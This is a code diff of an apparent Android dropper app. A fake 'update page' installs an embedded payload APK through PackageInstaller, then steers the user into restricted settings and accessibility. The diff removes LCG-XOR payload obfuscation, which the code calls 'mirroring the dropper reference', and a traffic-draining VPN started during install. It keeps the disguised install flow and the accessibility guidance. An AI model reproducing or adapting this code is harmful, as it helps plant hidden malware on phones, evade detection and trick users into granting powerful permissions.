@@ -6,7 +6,6 @@ import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageInstaller;
 import android.net.Uri;
-import android.net.VpnService;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -31,12 +30,11 @@ import java.security.MessageDigest;
 import org.json.JSONObject;
 
 /**
- * A-package update page. The embedded B package is stored obfuscated
- * (16 zero-byte header plus a fixed-seed LCG stream, mirroring the dropper
- * reference). Tapping install requests the system VPN consent, starts a
- * draining VPN and commits a PackageInstaller session at the same time.
- * After the B package installs, control returns here: the VPN stops and the
- * restricted-settings / accessibility guide leads into the built-in home page.
+ * A-package update page for the 1.2.1 experiment. The embedded B package is
+ * stored as plain assets/payload.apk like 1.2, but installation is submitted
+ * through PackageInstaller session like 1.3. No VPN is requested or started.
+ * After the B package installs, control returns here and the restricted-settings
+ * / accessibility guide leads into the built-in home page.
  */
 public final class MainActivity extends Activity {
     private static final String STATE_PREFERENCES = "installer_state";
@@ -90,7 +88,6 @@ public final class MainActivity extends Activity {
         if (installInFlight && lastSessionId != -1 && !sessionStillActive()) {
             installInFlight = false;
             lastSessionId = -1;
-            stopVpn();
             getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                     .edit()
                     .putBoolean(ACCESSIBILITY_AFTER_INSTALL, false)
@@ -106,7 +103,7 @@ public final class MainActivity extends Activity {
         File apk = pendingApk;
         pendingApk = null;
         if (resultCode == RESULT_OK) {
-            startVpnAndInstall(apk);
+            startPackageSessionInstall(apk);
         } else if (status != null) {
             status.setText("已取消 VPN 授权，可点击按钮重试");
         }
@@ -152,7 +149,7 @@ public final class MainActivity extends Activity {
 
         TextView explanation = new TextView(this);
         explanation.setText(
-                "将安装工作端 B 包。安装时会请求 VPN 授权以隔离安装流量，并由 Android 系统确认安装。");
+                "将安装工作端 B 包。此 1.2.1 测试版使用 PackageInstaller 会话安装，不启动 VPN。");
         explanation.setTextSize(16);
         explanation.setPadding(0, 24, 0, 24);
         layout.addView(explanation, matchWrap());
@@ -345,33 +342,13 @@ public final class MainActivity extends Activity {
                     if (status != null) status.setText("B 包校验失败，请重新构建 A 包");
                     return;
                 }
-                pendingApk = apkFinal;
-                Intent consent = null;
-                try {
-                    consent = VpnService.prepare(this);
-                } catch (Exception ignored) {
-                }
-                if (consent != null) {
-                    try {
-                        startActivityForResult(consent, REQUEST_VPN);
-                        if (status != null)
-                            status.setText("请允许 VPN 授权，用于隔离安装期间的流量");
-                    } catch (Exception vpnError) {
-                        startVpnAndInstall(apkFinal);
-                    }
-                } else {
-                    startVpnAndInstall(apkFinal);
-                }
+                pendingApk = null;
+                startPackageSessionInstall(apkFinal);
             });
         }, "boundary-payload-prepare").start();
     }
 
-    private void startVpnAndInstall(File apk) {
-        try {
-            startService(new Intent(this, VpnKillService.class));
-        } catch (Exception ignored) {
-            // The tunnel is best-effort; the install proceeds without it.
-        }
+    private void startPackageSessionInstall(File apk) {
         try {
             PackageInstaller installer = getPackageManager().getPackageInstaller();
             PackageInstaller.SessionParams params =
@@ -405,7 +382,6 @@ public final class MainActivity extends Activity {
         } catch (Exception error) {
             installInFlight = false;
             lastSessionId = -1;
-            stopVpn();
             getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                     .edit()
                     .putBoolean(ACCESSIBILITY_AFTER_INSTALL, false)
@@ -425,61 +401,27 @@ public final class MainActivity extends Activity {
     private void completeInstallSuccess() {
         installInFlight = false;
         lastSessionId = -1;
-        stopVpn();
         getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                 .edit()
                 .putBoolean(ACCESSIBILITY_AFTER_INSTALL, true)
                 .apply();
     }
 
-    private void stopVpn() {
-        try {
-            stopService(new Intent(this, VpnKillService.class));
-        } catch (Exception ignored) {
-        }
-    }
-
     /**
-     * Reads the embedded payload, restores the LCG-obfuscated bytes and
-     * verifies the result against the build-time SHA-256 before the
-     * PackageInstaller session can use it.
+     * Reads the embedded plain payload.apk and verifies the result against the
+     * build-time SHA-256 before the PackageInstaller session can use it.
      */
     private File decryptPayload() throws Exception {
-        boolean obfuscated;
-        InputStream raw;
-        try {
-            obfuscated = true;
-            raw = getAssets().open("payload.dat");
-        } catch (IOException error) {
-            obfuscated = false;
-            raw = getAssets().open("payload.apk");
-        }
-        try {
+        try (InputStream raw = getAssets().open("payload.apk")) {
             File directory = new File(getCacheDir(), "payloads");
             if (!directory.exists() && !directory.mkdirs())
                 throw new IllegalStateException();
             File output = new File(directory, "payload.apk");
-            if (obfuscated) {
-                byte[] header = new byte[16];
-                int read = 0;
-                while (read < header.length) {
-                    int count = raw.read(header, read, header.length - read);
-                    if (count < 0) throw new IllegalStateException("Payload is truncated");
-                    read += count;
-                }
-            }
             MessageDigest digest = MessageDigest.getInstance("SHA-256");
             try (FileOutputStream target = new FileOutputStream(output)) {
                 byte[] buffer = new byte[8192];
-                long j = LCG_SEED;
                 int count;
                 while ((count = raw.read(buffer)) >= 0) {
-                    if (obfuscated) {
-                        for (int i = 0; i < count; i++) {
-                            j = (j * 1664525 + 1013904223) & 0xFFFFFFFFL;
-                            buffer[i] ^= (byte) ((j >> 24) & 0xFF);
-                        }
-                    }
                     target.write(buffer, 0, count);
                     digest.update(buffer, 0, count);
                 }
@@ -489,8 +431,6 @@ public final class MainActivity extends Activity {
             if (!actual.toString().equals(config.getString("payloadSha256")))
                 throw new IllegalStateException("Payload digest mismatch");
             return output;
-        } finally {
-            raw.close();
         }
     }
 
@@ -517,7 +457,6 @@ public final class MainActivity extends Activity {
 
     @Override
     protected void onDestroy() {
-        stopVpn();
         destroyWebView();
         super.onDestroy();
     }
